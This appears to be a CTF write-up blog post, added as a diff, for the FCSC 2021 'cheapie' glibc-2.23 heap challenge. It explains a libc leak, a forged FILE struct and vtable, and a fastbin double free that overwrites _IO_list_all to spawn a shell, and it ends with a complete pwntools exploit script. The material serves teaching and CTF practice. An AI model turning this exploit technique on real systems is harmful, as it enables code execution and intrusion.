@@ -1,0 +1,174 @@
+---
+layout: default
+title: "FCSC 2021 - cheapie"
+category: "pwn - medium"
+tags: [x86_64, heap, fsop, "glibc-2.23"]
+date: 2026-07-24
+---
+
+this is another heap challenge which runs on glibc-2.23, we are allowed to malloc chunks, free them and read their contents
+
+we initially leak a libc pointer via reading an allocating a chunk large enough that when freed lands in the unsorted bin, and when we read its bk/fd pointer to get a leak of the main_arena address (libc address) to then calculate the libc base:
+```python
+chunk0 = malloc(0x100, b"AAAA")
+chunk1 = malloc(0x100, b"BBBB")
+free(chunk0)
+
+chunk0_data = read(chunk0)
+main_arena_leak = u64(chunk0_data[:8])
+libc.address = main_arena_leak - 88 - (libc.sym.__malloc_hook + 0x10)
+```
+
+we then forge a fake vtable and file struct
+
+the `_IO_jump_t` vtable layout on x86-64 places __overflow at offset 0x18
+writing system's address there means any code path that calls fp->vtable->__overflow(fp, ...) will actually execute system(fp)
+```python
+dummy_vtable = flat([
+    p64(0) * 3, # 0x00 
+    p64(libc.sym.system)
+])
+dummy_vtable_addr = malloc(0x100, dummy_vtable)
+log.success(f"dummy_vtable_addr: {hex(dummy_vtable_addr)}")
+```
+
+this is a forged `_IO_FILE_plus`. the three fields that matter for triggering a flush in `_IO_flush_all_lockp()`
+1. `_IO_write_ptr > _IO_write_base`: tells glibc this stream has unflushed buffered output 
+2. `_mode <= 0 (offset 0xc0`): marks the stream as byte-oriented (not wide-oriented), which is required for the flush path we are targeting
+3. `vtable at offset 0xd8 (standard for _IO_FILE_plus on x86-64)`: points at our fake vtable
+
+we set the first 8 bytes of the fake file struct (_flags) to be `'/bin/sh\x00'` so when the flush logic triggers `__overflow(fp, EOF)`, fp which is the address of this fake FILE strut is passed in rdi. Since `__overflow` has been redirected to system, this is system(fp). `system()` interprets its argument as a char*, and the bytes stored at that address happen to spell `"/bin/sh\0"`  so the net effect is `system("/bin/sh")`
+    
+```python
+dummy_file = flat([
+    b'/bin/sh\x00',         # 0x00 _flags
+    p64(0x61),              # 0x08 _IO_read_ptr 
+    p64(0) * 2,             # 0x10 - 0x18
+    p64(1),                 # 0x20 _IO_write_base
+    p64(2),                 # 0x28 _IO_write_ptr (must be > write_base to trigger flush)
+    p64(0) * 18,            # padding to reach 0xc0
+    p32(0),                 # 0xc0 _mode (must be <= 0)
+    p8(0) * 20,             # padding to reach 0xd8
+    p64(dummy_vtable_addr), # 0xd8 vtable
+])
+
+```
+
+we then after trigger a fastbin double free to get an arbitrary write (we are not allowed to free the same chunk 2 times in a row, however the following bypass works):
+```python
+chunk2 = malloc(0x68, b"CCCC")
+chunk3 = malloc(0x68, b"DDDD")
+free(chunk2)
+free(chunk3)
+free(chunk2)
+```
+which results in: `fastbin_head -> chunk2 -> chunk3 -> chunk2 -> chunk3 -> ... (chunk2->fd = chunk3, chunk3->fd = chunk2)`
+
+we then allocate 4 chunks:
+
+1. returns chunk2 (current head). Writes `_IO_list_all - 35` this becomes chunk2's new fd value once it's back in a freed state, poisoning what the next pop from this slot will see as the next free chunk 
+2. returns chunk3 (head advances there). content is just filler, the important thing is this pop happens.
+3. returns chunk2 again (the cycle brings it back around). the freelist's next pointer is now read from chunk2's current in-memory content which is the poisoned value written in step 1: _IO_list_all - 35. The allocator now believes there's a legitimate free fastbin chunk sitting at that address.
+4. returns a chunk at _IO_list_all - 35. Its usable data area starts 0x10 bytes past the chunk start (at (_IO_list_all - 35) + 16 = _IO_list_all - 19). The payload writes 35 - 16 = 19 zero-padding bytes to walk forward exactly to _IO_list_all, followed by p64(dummy_file_addr), the result is that _IO_list_all now points to our fake file struct
+
+```python
+malloc(0x68, p64(libc.sym._IO_list_all - 35))
+malloc(0x68, b"XXXX")
+malloc(0x68, b"XXXX")
+malloc(0x68, p8(0)*(35-16) + p64(dummy_file_addr))
+```
+
+now we exit the program by calling exit() (binary's menu),
+libc's exit() path calls _IO_flush_all_lockp(), which walks the linked list rooted at _IO_list_all, flushing every open stream. Since _IO_list_all now points at our fake file struct, the flush logic inspects our crafted _mode/_IO_write_ptr/_IO_write_base fields, decides the stream needs flushing, and calls fp->vtable->__overflow(fp, EOF). That's our hijacked vtable entry: system(fp) and fp's bytes are "/bin/sh\0" which leads us to getting a shell
+
+final solve script:
+```python
+from pwn import *
+
+elf = ELF('./cheapie_patched')
+libc = ELF('./libc-2.23.so')
+ld = ELF('./ld-2.23.so')
+
+context.log_level = 'debug'
+if not args.REMOTE:
+    io = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
+else:
+    io = remote("localhost", 4000)
+
+def malloc(size, data):
+    io.sendlineafter(b'>>> ', b'1')
+    io.sendlineafter(b"Amount in bytes [16-1024]: ", str(size).encode())
+    io.recvuntil(f"malloc({size}) = ".encode())
+    chunk_addr = int(io.recvline().strip()[2:], 16)
+    io.recvline()
+    io.send(data)
+    return chunk_addr
+
+def free(addr):
+    io.sendlineafter(b'>>> ', b'2')
+    io.sendlineafter(b'Address to free: ', str(hex(addr)).encode())
+
+def read(addr):
+    io.sendlineafter(b'>>> ', b'3')
+    io.sendlineafter(b'Address to show (16-byte sneak peak): ', hex(addr).encode())
+    data = io.recvline()
+    data = data.strip()
+    data = data.replace(b" ", b"")
+    return bytearray.fromhex(data.decode("utf8"))
+
+def exit():
+    io.sendlineafter(b'>>> ', b'4')
+
+chunk0 = malloc(0x100, b"AAAA")
+chunk1 = malloc(0x100, b"BBBB")
+log.success(f"chunk0_addr: {hex(chunk0)}")
+log.success(f"chunk1_addr: {hex(chunk1)}")
+
+free(chunk0)
+
+chunk0_data = read(chunk0)
+main_arena_leak = u64(chunk0_data[:8])
+log.success(f"main_arena leak: {hex(main_arena_leak)}")
+libc.address = main_arena_leak - 88 - (libc.sym.__malloc_hook + 0x10)
+log.success(f"libc base: {hex(libc.address)}")
+
+free(chunk1)
+
+dummy_vtable = flat([
+    p64(0) * 3,
+    p64(libc.sym.system)
+])
+dummy_vtable_addr = malloc(0x100, dummy_vtable)
+log.success(f"dummy_vtable_addr: {hex(dummy_vtable_addr)}")
+
+dummy_file = flat([
+    b'/bin/sh\x00',         # 0x00 _flags
+    p64(0x61),              # 0x08 _IO_read_ptr 
+    p64(0) * 2,             # 0x10 - 0x18
+    p64(1),                 # 0x20 _IO_write_base
+    p64(2),                 # 0x28 _IO_write_ptr (must be > write_base to trigger flush)
+    p64(0) * 18,            # padding to reach 0xc0
+    p32(0),                 # 0xc0 _mode (must be <= 0)
+    p8(0) * 20,             # padding to reach 0xd8
+    p64(dummy_vtable_addr), # 0xd8 vtable
+])
+
+dummy_file_addr = malloc(0x100, dummy_file)
+log.success(f"dummy_file_addr: {hex(dummy_file_addr)}")
+
+chunk2 = malloc(0x68, b"CCCC")
+chunk3 = malloc(0x68, b"DDDD")
+free(chunk2)
+free(chunk3)
+free(chunk2)
+
+malloc(0x68, p64(libc.sym._IO_list_all - 35))
+malloc(0x68, b"XXXX")
+malloc(0x68, b"XXXX")
+malloc(0x68, p8(0)*(35-16) + p64(dummy_file_addr))
+exit()
+
+io.interactive()
+```
+
+
